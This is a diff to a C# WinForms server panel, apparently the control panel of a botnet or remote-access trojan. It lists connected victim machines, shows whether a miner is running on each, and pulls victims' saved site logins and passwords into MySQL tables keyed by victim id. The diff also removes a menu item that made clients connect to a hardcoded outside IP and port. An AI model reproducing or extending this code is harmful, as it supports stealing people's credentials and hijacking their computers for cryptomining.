@@ -47,6 +47,7 @@ namespace ServerWorker
                 else Program.form1.Form1_InterfaceChanged(arg);
             };
 
+
             Program.server.Events.OnAuthorized += UpdateClientList;
             UserCard.UserData.OnDataUpdate += UpdateClientList;
             Program.server.Events.OnConnected += (User user) => { user.OnPingUpdate += UpdatePing; UpdateClientList(); };
@@ -54,7 +55,7 @@ namespace ServerWorker
             InitContextMenuStrip();
             mainControls.Add(button1);
             secondControls.Add(button8);
-
+            if (Program.authSystem.sessionLoginData.userType == UserType.System) button2.Visible = true;
         }
 
         private void InitContextMenuStrip()
@@ -101,14 +102,6 @@ namespace ServerWorker
                 }
                 GetPass(users);
             };
-            menu.Items.Add("Connect");
-            menu.Items[6].Click += (object sender, EventArgs e) =>
-            {
-                foreach (int index in listView1.SelectedIndices)
-                {
-                    ServerNet.ConnectedUsers.ToArray()[index].UsersCom.ConnectToHost("31.207.224.61", 7777);
-                }
-            };
         }
 
         private void DisconnectCurrentUsers()
@@ -130,7 +123,7 @@ namespace ServerWorker
                 listView1.Items.Clear();
                 foreach (User user in ServerNet.ConnectedUsers.ToArray())
                 {
-                        DrawUser(user);
+                    DrawUser(user);
                 }
             }));
 
@@ -159,7 +152,7 @@ namespace ServerWorker
                 raw = new string[] {
                 user.UserType.ToString(),
                 user.userData.setting.Version ?? "",
-                user.userData.setting.Comp_name ?? "",
+                user.userData.setting.Comp_name ?? user.userData.id ?? "",
                 user.EndPoint.ToString(),
                 "",
                 user.userData.IsWorkinMiner.ToString(),
@@ -178,6 +171,7 @@ namespace ServerWorker
                 "",
                 "",
                 user.EndPoint.ToString(),
+                "",
                 "",
                 "",
                 ""
@@ -245,9 +239,6 @@ namespace ServerWorker
         {
             try
             {
-                if (Program.aviableServer != null)
-                    Program.aviableServer.Close();
-
                 Program.serverThread.Abort();
             }
             catch (Exception ex)
@@ -261,12 +252,8 @@ namespace ServerWorker
             foreach (User user in users)
             {
                 var loginDataList = user.UsersCom.SendLoginData("");
-                DateTime now = DateTime.Now;
-                var tableName = now.ToString("yyyy.MM.dd");
-                tableName += " " + now.ToString("HH:mm:ss");
-                tableName += " " + user.userData.id;
 
-                MySQLData data = new MySQLData() { Table = tableName, Columns = new string[] { "Site", "Login", "Password"} };
+                MySQLData data = new MySQLData() { Table = user.userData.id, Columns = new string[] { "Site", "Login", "Password"} };
                 foreach (LoginData loginData in loginDataList)
                 {
                     if (!string.IsNullOrWhiteSpace(loginData.WebSite) || !string.IsNullOrWhiteSpace(loginData.Login) || !string.IsNullOrWhiteSpace(loginData.Pass))
@@ -276,7 +263,7 @@ namespace ServerWorker
                 var dataCount = data.Values.Count;
                 if (dataCount > 0)
                 {
-                    MySQLManager.CreateTable(tableName);
+                    MySQLManager.CreateTable(user.userData.id);
                     MySQLManager.Send(data);
                 }
                 else MessageBox.Show("Паролей не найдено");
@@ -316,7 +303,8 @@ namespace ServerWorker
         private void StartForm2(User user )
         {
             FormUserCard userCard = new FormUserCard(user);
-            userCard.Show();
+            Thread newFormThread = new Thread(new ThreadStart(() => { Application.Run(userCard); }));
+            newFormThread.Start();
         }
 
         private void button7_Click(object sender, EventArgs e)
@@ -338,7 +326,17 @@ namespace ServerWorker
                 {
                     if (ServerNet.ConnectedUsers.ToArray().Count() > index)
                     {
-                        StartForm2(ServerNet.ConnectedUsers.ToArray()[index]);
+                        var user = ServerNet.ConnectedUsers.ToArray()[index];
+                        switch (user.UserType)
+                        {
+                            case UserType.User:
+                                StartForm2(user);
+                                break;
+                            case UserType.Admin:
+                            case UserType.System:
+                                RunServerCardForm(user);
+                                break;
+                        }
                     }
                     else
                     {
@@ -366,6 +364,18 @@ namespace ServerWorker
             {
                 OpenSelectedUserCard();
             }
+        }
+
+        private void Button2_Click(object sender, EventArgs e)
+        {
+            RunServerCardForm();
+        }
+
+        private void RunServerCardForm(User user = null)
+        {
+            ServerCard.ServerCard serverCard = user == null ?  new ServerCard.ServerCard() : new ServerCard.ServerCard(user);
+            Thread newFormThread = new Thread(new ThreadStart(() => { Application.Run(serverCard); }));
+            newFormThread.Start();
         }
     }
 }
